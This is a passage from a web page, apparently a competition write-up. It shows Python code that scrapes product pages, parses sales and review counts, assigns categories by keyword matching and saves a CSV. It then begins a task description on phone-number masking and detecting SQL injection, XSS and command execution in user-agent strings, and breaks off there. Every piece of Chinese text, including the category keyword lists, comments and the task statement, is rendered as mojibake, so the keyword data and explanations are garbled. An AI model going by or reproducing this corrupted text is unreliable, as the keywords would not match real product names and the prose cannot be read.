class="hljs-string">&#x27;è²è—•&#x27;</span>, <span class="hljs-string">&#x27;èŒè‡&#x27;</span>, <span class="hljs-string">&#x27;è±†è§’&#x27;</span>, <span class="hljs-string">&#x27;å—ç“œ&#x27;</span>, <span class="hljs-string">&#x27;å±±è¯&#x27;</span>, <span class="hljs-string">&#x27;èŠ¦ç¬‹&#x27;</span>,<br>         <span class="hljs-string">&#x27;ç§‹è‘µ&#x27;</span>, <span class="hljs-string">&#x27;å¨ƒå¨ƒèœ&#x27;</span>, <span class="hljs-string">&#x27;å†°è‰&#x27;</span>, <span class="hljs-string">&#x27;ç¾½è¡£ç”˜è“&#x27;</span>, <span class="hljs-string">&#x27;èŠ½è‹—èœ&#x27;</span>]),<br><br>    (<span class="hljs-number">8</span>, [<span class="hljs-string">&#x27;æ°´æœ&#x27;</span>, <span class="hljs-string">&#x27;è¿›å£&#x27;</span>, <span class="hljs-string">&#x27;æ¦´è²&#x27;</span>, <span class="hljs-string">&#x27;è½¦å˜å­&#x27;</span>, <span class="hljs-string">&#x27;è“è“&#x27;</span>, <span class="hljs-string">&#x27;è‰è“&#x27;</span>, <span class="hljs-string">&#x27;èŠ’æœ&#x27;</span>, <span class="hljs-string">&#x27;å¥‡å¼‚æœ&#x27;</span>, <span class="hljs-string">&#x27;å±±ç«¹&#x27;</span>,<br>         <span class="hljs-string">&#x27;è èèœœ&#x27;</span>, <span class="hljs-string">&#x27;ç‰›æ²¹æœ&#x27;</span>, <span class="hljs-string">&#x27;è²é›¾&#x27;</span>, <span class="hljs-string">&#x27;é‡Šè¿¦æœ&#x27;</span>, <span class="hljs-string">&#x27;ç«é¾™æœ&#x27;</span>, <span class="hljs-string">&#x27;æ¤°å­&#x27;</span>, <span class="hljs-string">&#x27;ç™¾é¦™æœ&#x27;</span>, <span class="hljs-string">&#x27;ç•ªçŸ³æ¦´&#x27;</span>,<br>         <span class="hljs-string">&#x27;æ¨æ¡ƒ&#x27;</span>, <span class="hljs-string">&#x27;æ‡æ·&#x27;</span>, <span class="hljs-string">&#x27;è¥¿æ¢…&#x27;</span>, <span class="hljs-string">&#x27;æ— èŠ±æœ&#x27;</span>, <span class="hljs-string">&#x27;äººå‚æœ&#x27;</span>]),<br><br>    (<span class="hljs-number">4</span>, [<span class="hljs-string">&#x27;ä¹¦ç±&#x27;</span>, <span class="hljs-string">&#x27;å°è¯´&#x27;</span>, <span class="hljs-string">&#x27;æ•™æ&#x27;</span>, <span class="hljs-string">&#x27;å„¿ç«¥è¯»ç‰©&#x27;</span>, <span class="hljs-string">&#x27;ç§‘æŠ€&#x27;</span>, <span class="hljs-string">&#x27;æ–‡å­¦&#x27;</span>, <span class="hljs-string">&#x27;å†å²&#x27;</span>, <span class="hljs-string">&#x27;å“²å­¦&#x27;</span>, <span class="hljs-string">&#x27;å¿ƒç†å­¦&#x27;</span>,<br>         <span class="hljs-string">&#x27;ç»æµå­¦&#x27;</span>, <span class="hljs-string">&#x27;è®¡ç®—æœº&#x27;</span>, <span class="hljs-string">&#x27;ç¼–ç¨‹&#x27;</span>, <span class="hljs-string">&#x27;åŒ»å­¦&#x27;</span>, <span class="hljs-string">&#x27;æ³•å¾‹&#x27;</span>, <span class="hljs-string">&#x27;å»ºç­‘&#x27;</span>, <span class="hljs-string">&#x27;è‰ºæœ¯&#x27;</span>, <span class="hljs-string">&#x27;æ‘„å½±&#x27;</span>, <span class="hljs-string">&#x27;æ—…æ¸¸æŒ‡å—&#x27;</span>,<br>         <span class="hljs-string">&#x27;å­—å¸–&#x27;</span>, <span class="hljs-string">&#x27;ç»˜æœ¬&#x27;</span>, <span class="hljs-string">&#x27;ç™¾ç§‘å…¨ä¹¦&#x27;</span>, <span class="hljs-string">&#x27;å­—å…¸&#x27;</span>, <span class="hljs-string">&#x27;è€ƒè¯•ç”¨ä¹¦&#x27;</span>]),<br><br>    (<span class="hljs-number">24</span>, [<span class="hljs-string">&#x27;æ¸¸æˆ&#x27;</span>, <span class="hljs-string">&#x27;PS5&#x27;</span>, <span class="hljs-string">&#x27;Switch&#x27;</span>, <span class="hljs-string">&#x27;Xbox&#x27;</span>, <span class="hljs-string">&#x27;æ‰‹æŸ„&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆå¡å¸¦&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆå…‰ç›˜&#x27;</span>, <span class="hljs-string">&#x27;ç”µç«æ¤…&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ¸¸æˆé¼ æ ‡&#x27;</span>, <span class="hljs-string">&#x27;æœºæ¢°é”®ç›˜&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆè€³æœº&#x27;</span>, <span class="hljs-string">&#x27;VRè®¾å¤‡&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆå‘¨è¾¹&#x27;</span>, <span class="hljs-string">&#x27;æ‰‹åŠ&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆç‚¹å¡&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ¸¸æˆåŠ é€Ÿå™¨&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆçš®è‚¤&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆè´¦å·&#x27;</span>, <span class="hljs-string">&#x27;MODå·¥å…·&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆæ”»ç•¥ä¹¦&#x27;</span>]),<br><br>    (<span class="hljs-number">12</span>, [<span class="hljs-string">&#x27;å½©å¦†&#x27;</span>, <span class="hljs-string">&#x27;å£çº¢&#x27;</span>, <span class="hljs-string">&#x27;ç²‰åº•&#x27;</span>, <span class="hljs-string">&#x27;çœ¼å½±&#x27;</span>, <span class="hljs-string">&#x27;çœ‰ç¬”&#x27;</span>, <span class="hljs-string">&#x27;è…®çº¢&#x27;</span>, <span class="hljs-string">&#x27;é®ç‘•&#x27;</span>, <span class="hljs-string">&#x27;åŒ–å¦†åˆ·&#x27;</span>, <span class="hljs-string">&#x27;ç¾å¦†è›‹&#x27;</span>,<br>          <span class="hljs-string">&#x27;å®šå¦†å–·é›¾&#x27;</span>, <span class="hljs-string">&#x27;ç«æ¯›è†&#x27;</span>, <span class="hljs-string">&#x27;çœ¼çº¿ç¬”&#x27;</span>, <span class="hljs-string">&#x27;ä¿®å®¹æ£’&#x27;</span>, <span class="hljs-string">&#x27;é«˜å…‰&#x27;</span>, <span class="hljs-string">&#x27;å¦†å‰ä¹³&#x27;</span>, <span class="hljs-string">&#x27;å¸å¦†æ°´&#x27;</span>, <span class="hljs-string">&#x27;ç¾ç³&#x27;</span>,<br>          <span class="hljs-string">&#x27;å‡ç«æ¯›&#x27;</span>, <span class="hljs-string">&#x27;ç¾ç”²è´´&#x27;</span>, <span class="hljs-string">&#x27;åŒ–å¦†é•œ&#x27;</span>, <span class="hljs-string">&#x27;ç¾å®¹å·¥å…·&#x27;</span>, <span class="hljs-string">&#x27;é¦™æ°´&#x27;</span>]),<br><br>    (<span class="hljs-number">17</span>, [<span class="hljs-string">&#x27;åºŠä¸Šç”¨å“&#x27;</span>, <span class="hljs-string">&#x27;å››ä»¶å¥—&#x27;</span>, <span class="hljs-string">&#x27;ç¾½ç»’è¢«&#x27;</span>, <span class="hljs-string">&#x27;æ•å¤´&#x27;</span>, <span class="hljs-string">&#x27;åºŠå«&#x27;</span>, <span class="hljs-string">&#x27;èš•ä¸è¢«&#x27;</span>, <span class="hljs-string">&#x27;ä¹³èƒ¶æ•&#x27;</span>, <span class="hljs-string">&#x27;å‡‰å¸­&#x27;</span>,<br>          <span class="hljs-string">&#x27;åºŠè¤¥&#x27;</span>, <span class="hljs-string">&#x27;åºŠç¬ &#x27;</span>, <span class="hljs-string">&#x27;è¢«å¥—&#x27;</span>, <span class="hljs-string">&#x27;æ•å¥—&#x27;</span>, <span class="hljs-string">&#x27;èšŠå¸&#x27;</span>, <span class="hljs-string">&#x27;ç”µçƒ­æ¯¯&#x27;</span>, <span class="hljs-string">&#x27;è®°å¿†æ£‰&#x27;</span>, <span class="hljs-string">&#x27;æ¦»æ¦»ç±³&#x27;</span>,<br>          <span class="hljs-string">&#x27;åºŠå¹”&#x27;</span>, <span class="hljs-string">&#x27;é å«&#x27;</span>, <span class="hljs-string">&#x27;æŠ±æ•&#x27;</span>, <span class="hljs-string">&#x27;åºŠå°¾å‡³&#x27;</span>, <span class="hljs-string">&#x27;å¸ƒè‰ºåºŠ&#x27;</span>]),<br><br>    (<span class="hljs-number">18</span>, [<span class="hljs-string">&#x27;æ´—æŠ¤&#x27;</span>, <span class="hljs-string">&#x27;æ´—å‘æ°´&#x27;</span>, <span class="hljs-string">&#x27;æ²æµ´éœ²&#x27;</span>, <span class="hljs-string">&#x27;ç‰™è†&#x27;</span>, <span class="hljs-string">&#x27;æ´—é¢å¥¶&#x27;</span>, <span class="hljs-string">&#x27;æŠ¤å‘ç´ &#x27;</span>, <span class="hljs-string">&#x27;èº«ä½“ä¹³&#x27;</span>, <span class="hljs-string">&#x27;æ´—æ‰‹æ¶²&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ´—è¡£æ¶²&#x27;</span>, <span class="hljs-string">&#x27;æŸ”é¡ºå‰‚&#x27;</span>, <span class="hljs-string">&#x27;æ¶ˆæ¯’æ¶²&#x27;</span>, <span class="hljs-string">&#x27;æ´å•çµ&#x27;</span>, <span class="hljs-string">&#x27;å¨æˆ¿æ¸…æ´å‰‚&#x27;</span>, <span class="hljs-string">&#x27;ç»ç’ƒæ°´&#x27;</span>, <span class="hljs-string">&#x27;é™¤éœ‰å‰‚&#x27;</span>,<br>          <span class="hljs-string">&#x27;ç©ºæ°”æ¸…æ–°å‰‚&#x27;</span>, <span class="hljs-string">&#x27;é¦™è–°&#x27;</span>, <span class="hljs-string">&#x27;é™¤è¨ä»ª&#x27;</span>, <span class="hljs-string">&#x27;æ´—è¡£å‡ç &#x27;</span>, <span class="hljs-string">&#x27;è¡£ç‰©é™¤èŒæ¶²&#x27;</span>]),<br><br>    (<span class="hljs-number">7</span>, [<span class="hljs-string">&#x27;åŠå…¬&#x27;</span>, <span class="hljs-string">&#x27;æ‰“å°æœº&#x27;</span>, <span class="hljs-string">&#x27;æŠ•å½±ä»ª&#x27;</span>, <span class="hljs-string">&#x27;å¤å°çº¸&#x27;</span>, <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹&#x27;</span>, <span class="hljs-string">&#x27;è®¢ä¹¦æœº&#x27;</span>, <span class="hljs-string">&#x27;ç¢çº¸æœº&#x27;</span>, <span class="hljs-string">&#x27;è€ƒå‹¤æœº&#x27;</span>,<br>         <span class="hljs-string">&#x27;ç™½æ¿&#x27;</span>, <span class="hljs-string">&#x27;ä¼šè®®ç”µè¯&#x27;</span>, <span class="hljs-string">&#x27;æ–‡ä»¶æŸœ&#x27;</span>, <span class="hljs-string">&#x27;ä¿é™©ç®±&#x27;</span>, <span class="hljs-string">&#x27;è£…è®¢æœº&#x27;</span>, <span class="hljs-string">&#x27;æ ‡ç­¾æœº&#x27;</span>, <span class="hljs-string">&#x27;æ”¯ç¥¨æ‰“å°æœº&#x27;</span>,<br>         <span class="hljs-string">&#x27;æ‰«æä»ª&#x27;</span>, <span class="hljs-string">&#x27;æŒ‡çº¹æ‰“å¡æœº&#x27;</span>, <span class="hljs-string">&#x27;åŠå…¬æ²™å‘&#x27;</span>, <span class="hljs-string">&#x27;ä¼šè®®æ¡Œ&#x27;</span>, <span class="hljs-string">&#x27;åŠå…¬éš”æ–­&#x27;</span>]),<br><br>    (<span class="hljs-number">3</span>, [<span class="hljs-string">&#x27;å®¶å±…&#x27;</span>, <span class="hljs-string">&#x27;æ²™å‘&#x27;</span>, <span class="hljs-string">&#x27;èŒ¶å‡ &#x27;</span>, <span class="hljs-string">&#x27;çª—å¸˜&#x27;</span>, <span class="hljs-string">&#x27;åœ°æ¯¯&#x27;</span>, <span class="hljs-string">&#x27;è¡£æŸœ&#x27;</span>, <span class="hljs-string">&#x27;é¤æ¡Œ&#x27;</span>, <span class="hljs-string">&#x27;ç”µè§†æŸœ&#x27;</span>, <span class="hljs-string">&#x27;é‹æŸœ&#x27;</span>,<br>         <span class="hljs-string">&#x27;ç½®ç‰©æ¶&#x27;</span>, <span class="hljs-string">&#x27;è£…é¥°ç”»&#x27;</span>, <span class="hljs-string">&#x27;èŠ±ç“¶&#x27;</span>, <span class="hljs-string">&#x27;å£çº¸&#x27;</span>, <span class="hljs-string">&#x27;ç¯å…·&#x27;</span>, <span class="hljs-string">&#x27;æ™ºèƒ½é—¨é”&#x27;</span>, <span class="hljs-string">&#x27;æ™¾è¡£æ¶&#x27;</span>, <span class="hljs-string">&#x27;æ”¶çº³ç›’&#x27;</span>,<br>         <span class="hljs-string">&#x27;å¢™è´´&#x27;</span>, <span class="hljs-string">&#x27;é—¨å«&#x27;</span>, <span class="hljs-string">&#x27;å®¶å±…æ‘†ä»¶&#x27;</span>, <span class="hljs-string">&#x27;é¦™ç‚‰&#x27;</span>]),<br><br>    (<span class="hljs-number">9</span>, [<span class="hljs-string">&#x27;å® ç‰©&#x27;</span>, <span class="hljs-string">&#x27;çŒ«ç²®&#x27;</span>, <span class="hljs-string">&#x27;ç‹—ç²®&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©çª&#x27;</span>, <span class="hljs-string">&#x27;ç‰µå¼•ç»³&#x27;</span>, <span class="hljs-string">&#x27;çŒ«ç ‚&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©ç©å…·&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©è¡£æœ&#x27;</span>,<br>         <span class="hljs-string">&#x27;å® ç‰©æµ´æ¶²&#x27;</span>, <span class="hljs-string">&#x27;é©±è™«è¯&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©ç¬¼&#x27;</span>, <span class="hljs-string">&#x27;é£Ÿç›†&#x27;</span>, <span class="hljs-string">&#x27;è‡ªåŠ¨å–‚é£Ÿå™¨&#x27;</span>, <span class="hljs-string">&#x27;çŒ«æŠ“æ¿&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©æ¨è½¦&#x27;</span>,<br>         <span class="hljs-string">&#x27;å® ç‰©èƒŒåŒ…&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©ç¾å®¹&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©åŒ»é™¢&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©æ®¡è‘¬&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©èŠ¯ç‰‡&#x27;</span>]),<br><br>    (<span class="hljs-number">13</span>, [<span class="hljs-string">&#x27;ä¿å¥&#x27;</span>, <span class="hljs-string">&#x27;é±¼æ²¹&#x27;</span>, <span class="hljs-string">&#x27;ç»´ç”Ÿç´ &#x27;</span>, <span class="hljs-string">&#x27;é’™ç‰‡&#x27;</span>, <span class="hljs-string">&#x27;è›‹ç™½ç²‰&#x27;</span>, <span class="hljs-string">&#x27;ç›Šç”ŸèŒ&#x27;</span>, <span class="hljs-string">&#x27;è¤ªé»‘ç´ &#x27;</span>, <span class="hljs-string">&#x27;æŠ¤è‚ç‰‡&#x27;</span>,<br>          <span class="hljs-string">&#x27;èƒ¶åŸè›‹ç™½&#x27;</span>, <span class="hljs-string">&#x27;è‘¡è„ç±½&#x27;</span>, <span class="hljs-string">&#x27;è¾…é…¶Q10&#x27;</span>, <span class="hljs-string">&#x27;æ°¨ç³–&#x27;</span>, <span class="hljs-string">&#x27;è†³é£Ÿçº¤ç»´&#x27;</span>, <span class="hljs-string">&#x27;èœ‚èƒ¶&#x27;</span>, <span class="hljs-string">&#x27;å†¬è™«å¤è‰&#x27;</span>,<br>          <span class="hljs-string">&#x27;é˜¿èƒ¶&#x27;</span>, <span class="hljs-string">&#x27;ç‡•çª&#x27;</span>, <span class="hljs-string">&#x27;äººå‚&#x27;</span>, <span class="hljs-string">&#x27;çµèŠå­¢å­ç²‰&#x27;</span>, <span class="hljs-string">&#x27;æŒ‰æ‘©å™¨&#x27;</span>, <span class="hljs-string">&#x27;è¶³æµ´ç›†&#x27;</span>]),<br><br>    (<span class="hljs-number">19</span>, [<span class="hljs-string">&#x27;äº”é‡‘&#x27;</span>, <span class="hljs-string">&#x27;èºä¸åˆ€&#x27;</span>, <span class="hljs-string">&#x27;ç”µé’»&#x27;</span>, <span class="hljs-string">&#x27;æ‰³æ‰‹&#x27;</span>, <span class="hljs-string">&#x27;å·¥å…·ç®±&#x27;</span>, <span class="hljs-string">&#x27;è§’ç£¨æœº&#x27;</span>, <span class="hljs-string">&#x27;ç”µé”¤&#x27;</span>, <span class="hljs-string">&#x27;åˆ‡å‰²æœº&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ°´å¹³ä»ª&#x27;</span>, <span class="hljs-string">&#x27;å·å°º&#x27;</span>, <span class="hljs-string">&#x27;é’³å­&#x27;</span>, <span class="hljs-string">&#x27;ç„Šæª&#x27;</span>, <span class="hljs-string">&#x27;ç ‚è½®æœº&#x27;</span>, <span class="hljs-string">&#x27;å†²å‡»é’»&#x27;</span>, <span class="hljs-string">&#x27;ç”µåŠ¨èºä¸åˆ€&#x27;</span>, <span class="hljs-string">&#x27;å¼€å­”å™¨&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ°´ç®¡é…ä»¶&#x27;</span>, <span class="hljs-string">&#x27;é˜€é—¨&#x27;</span>, <span class="hljs-string">&#x27;å¯†å°èƒ¶&#x27;</span>, <span class="hljs-string">&#x27;è†¨èƒ€èºæ “&#x27;</span>, <span class="hljs-string">&#x27;ç»ç¼˜èƒ¶å¸¦&#x27;</span>]),<br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">match_category</span>(<span class="hljs-params">product_name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;æ™ºèƒ½åˆ†ç±»åŒ¹é…ç®—æ³•&quot;&quot;&quot;</span><br>    clean_name = product_name.lower()<br>    <span class="hljs-keyword">for</span> category_id, keywords <span class="hljs-keyword">in</span> CATEGORY_KEYWORDS:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(kw <span class="hljs-keyword">in</span> clean_name <span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> keywords):<br>            <span class="hljs-keyword">return</span> category_id<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># æœªåŒ¹é…åˆ†ç±»</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_sales</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;ç²¾å‡†è§£æé”€é‡æ•°å€¼&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># ç›´æ¥æå–æ ‡ç­¾å†…å®¹ä¸­çš„çº¯æ•°å­—</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(<span class="hljs-built_in">int</span>(text.strip()), <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-comment"># åŒé‡ä¿éšœï¼šæ­£åˆ™æå–</span><br>        numbers = re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, text)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(numbers[<span class="hljs-number">0</span>]) <span class="hljs-keyword">if</span> numbers <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_product_info</span>(<span class="hljs-params">session: requests.Session, product_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-type">Tuple</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;è·å–å¹¶è§£æå•†å“ä¿¡æ¯ï¼ˆå¢å¼ºæè¿°è§£æç‰ˆï¼‰&quot;&quot;&quot;</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;controller&quot;</span>: <span class="hljs-string">&quot;product&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;detail&quot;</span>,<br>        <span class="hljs-string">&quot;id&quot;</span>: product_id<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        response = session.get(<br>            Config.full_url(),<br>            params=params,<br>            timeout=Config.REQUEST_TIMEOUT<br>        )<br>        response.raise_for_status()<br>        soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><br>        <span class="hljs-comment"># è§£æå•†å“åç§°</span><br>        name_tag = soup.find(<span class="hljs-string">&#x27;h1&#x27;</span>, &#123;<span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;product-name&#x27;</span>&#125;)<br>        product_name = name_tag.text.strip() <span class="hljs-keyword">if</span> name_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br><br>        <span class="hljs-comment"># æ–°å¢ï¼šè§£æå•†å“æè¿°ï¼ˆå…³é”®ä¿®æ”¹ç‚¹ï¼‰</span><br>        desc_tag = soup.find(<span class="hljs-string">&#x27;div&#x27;</span>, &#123;<span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;product-description&#x27;</span>&#125;)<br>        product_desc = desc_tag.find(<span class="hljs-string">&#x27;p&#x27;</span>).text.strip() <span class="hljs-keyword">if</span> desc_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br><br>        <span class="hljs-comment"># åˆå¹¶åç§°å’Œæè¿°è¿›è¡ŒåŒ¹é…</span><br>        match_text = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;product_name&#125;</span> <span class="hljs-subst">&#123;product_desc&#125;</span>&quot;</span>.lower()<br><br>        <span class="hljs-comment"># è§£æé”€é‡ä¿¡æ¯</span><br>        sales_tag = soup.find(<span class="hljs-string">&#x27;span&#x27;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;productSales&#x27;</span>&#125;)<br>        sales_text = sales_tag.text.strip() <span class="hljs-keyword">if</span> sales_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;0&quot;</span><br>        sales = parse_sales(sales_text)<br><br>        <span class="hljs-comment"># è§£æè¯„è®ºæ•°é‡</span><br>        reviews_tag = soup.find(<span class="hljs-string">&#x27;div&#x27;</span>, &#123;<span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;reviews-container&#x27;</span>&#125;)<br>        reviews_number = <span class="hljs-built_in">len</span>(reviews_tag.find_all(<span class="hljs-string">&#x27;div&#x27;</span>, class_=<span class="hljs-string">&#x27;review-item&#x27;</span>)) <span class="hljs-keyword">if</span> reviews_tag <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># åˆ†ç±»åŒ¹é…ï¼ˆä½¿ç”¨åˆå¹¶æ–‡æœ¬ï¼‰</span><br>        category_id = match_category(match_text)  <span class="hljs-comment"># è¿™é‡Œä¼ å…¥åˆå¹¶åçš„æ–‡æœ¬</span><br><br>        <span class="hljs-keyword">return</span> (product_id, sales, category_id, reviews_number)<br><br>    <span class="hljs-keyword">except</span> requests.exceptions.HTTPError <span class="hljs-keyword">as</span> e:<br>        logger.warning(<span class="hljs-string">f&quot;å•†å“ <span class="hljs-subst">&#123;product_id&#125;</span> è¯·æ±‚å¤±è´¥: HTTP <span class="hljs-subst">&#123;e.response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.error(<span class="hljs-string">f&quot;å¤„ç†å•†å“ <span class="hljs-subst">&#123;product_id&#125;</span> æ—¶å‘ç”Ÿå¼‚å¸¸: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">data_validation</span>(<span class="hljs-params">df: pd.DataFrame</span>) -&gt; pd.DataFrame:<br>    <span class="hljs-string">&quot;&quot;&quot;æ•°æ®å®Œæ•´æ€§æ ¡éªŒ&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># å¤„ç†æœªåŒ¹é…åˆ†ç±»</span><br>    df[<span class="hljs-string">&#x27;category_id&#x27;</span>] = df[<span class="hljs-string">&#x27;category_id&#x27;</span>].replace(<span class="hljs-number">0</span>, <span class="hljs-number">25</span>)  <span class="hljs-comment"># é»˜è®¤å½’ç±»åˆ°å›­è‰º</span><br><br>    <span class="hljs-comment"># å¤„ç†å¼‚å¸¸è¯„è®ºæ•°</span><br>    df[<span class="hljs-string">&#x27;reviews_number&#x27;</span>] = df[<span class="hljs-string">&#x27;reviews_number&#x27;</span>].clip(lower=<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">return</span> df.sort_values(<span class="hljs-string">&#x27;product_id&#x27;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;ä¸»å¤„ç†æµç¨‹&quot;&quot;&quot;</span><br>    product_data = []<br><br>    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>        session.headers.update(Config.HEADERS)<br><br>        <span class="hljs-comment"># å¸¦é‡è¯•æœºåˆ¶çš„çˆ¬å–</span><br>        <span class="hljs-keyword">for</span> product_id <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, Config.MAX_PRODUCTS + <span class="hljs-number">1</span>), desc=<span class="hljs-string">&quot;å¤„ç†å•†å“&quot;</span>):<br>            <span class="hljs-keyword">for</span> retry <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>                <span class="hljs-keyword">if</span> info := fetch_product_info(session, product_id):<br>                    product_data.append(info)<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    logger.warning(<span class="hljs-string">f&quot;å•†å“ <span class="hljs-subst">&#123;product_id&#125;</span> ç¬¬ <span class="hljs-subst">&#123;retry + <span class="hljs-number">1</span>&#125;</span> æ¬¡é‡è¯•&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> product_data:<br>        logger.error(<span class="hljs-string">&quot;æœªè·å–åˆ°æœ‰æ•ˆæ•°æ®&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># æ•°æ®åŠ å·¥</span><br>    df = pd.DataFrame(<br>        product_data,<br>        columns=[<span class="hljs-string">&#x27;product_id&#x27;</span>, <span class="hljs-string">&#x27;sales&#x27;</span>, <span class="hljs-string">&#x27;category_id&#x27;</span>, <span class="hljs-string">&#x27;reviews_number&#x27;</span>]<br>    )<br><br>    df = data_validation(df)<br><br>    <span class="hljs-comment"># ä¿å­˜ç»“æœ</span><br>    df.to_csv(Config.OUTPUT_FILE, index=<span class="hljs-literal">False</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    logger.info(<span class="hljs-string">f&quot;æˆåŠŸç”Ÿæˆæ–‡ä»¶ <span class="hljs-subst">&#123;Config.OUTPUT_FILE&#125;</span>ï¼Œè®°å½•æ•°: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(df)&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="3-ä»»åŠ¡ä¸‰ï¼šéšç§ä¿æŠ¤ä¸æ¶æ„æ£€æµ‹"><a href="#3-ä»»åŠ¡ä¸‰ï¼šéšç§ä¿æŠ¤ä¸æ¶æ„æ£€æµ‹" class="headerlink" title="3.ä»»åŠ¡ä¸‰ï¼šéšç§ä¿æŠ¤ä¸æ¶æ„æ£€æµ‹"></a>3.ä»»åŠ¡ä¸‰ï¼šéšç§ä¿æŠ¤ä¸æ¶æ„æ£€æµ‹</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ã€é¢˜â¼²æè¿°ã€‘<br>é’ˆå¯¹åœ¨çº¿å›¢è´­å¹³å°æä¾›çš„â½¤â¼¾æ•°æ®ï¼Œä½ éœ€è¦çˆ¬å–æ•°æ®åè¿›â¾æ•°æ®è„±æ•ä¸æ¶æ„ä»£ç æ£€æµ‹ï¼Œåœ¨æ•°æ®è„±æ•ç¯èŠ‚ï¼Œä½ éœ€è¦å¯¹â¼¿æœºå·ç æŒ‰ç…§å¯¹åº”çš„è§„åˆ™è¿›â¾è„±æ•æ›¿æ¢ã€‚åœ¨æ¶æ„ä»£ç æ£€æµ‹ç¯èŠ‚ï¼Œä½ éœ€è¦å¯¹è¯„è®ºuser_agentè¿›â¾SQLæ³¨â¼Š<span class="hljs-regexp">/XSS/</span>å‘½ä»¤æ‰§â¾ç­‰æ¶æ„ä»£ç æ£€æµ‹ã€‚æŒ‰é™„ä»¶æ¨¡æ¿å’Œä»»åŠ¡ä¹¦è¦æ±‚æäº¤å¤„ç†åçš„submit_3.csvâ½‚ä»¶è¿›â¾è¯„åˆ†ã€‚<br><br>ã€ç­”æ¡ˆæäº¤ã€‘<br>æäº¤ä»…åŒ…å«<span 